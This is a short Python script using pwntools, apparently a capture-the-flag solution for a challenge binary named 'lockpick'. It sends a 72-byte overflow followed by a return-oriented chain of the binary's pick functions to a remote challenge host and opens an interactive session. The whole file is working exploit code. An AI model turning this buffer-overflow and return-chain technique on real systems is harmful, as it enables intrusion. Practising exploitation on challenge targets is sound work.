from pwn import *

# Start program
# io = process('./lockpick')
io = remote('env01.deadface.io', 9999)

elf = ELF("./lockpick", checksec=False)
pick3 = elf.symbols['pick3']
pick5 = elf.symbols['pick5']
pick4 = elf.symbols['pick4']
pick1 = elf.symbols['pick1']
pick2 = elf.symbols['pick2']
main  = elf.symbols['main']

ret = p64(0x000000000040101a)

offset = 72

payload = b'A' * offset
payload += ret + p64(pick3)
payload += ret + p64(pick5)
payload += ret + p64(pick4)
payload += ret + p64(pick1)
payload += ret + p64(pick2)
payload += ret + p64(main)


io.recvuntil(b'How do you open a lock with no key?\n')
io.sendline(payload)
io.recvuntil(b'How do you open a lock with no key?\n')
io.sendline(b'')
io.interactive()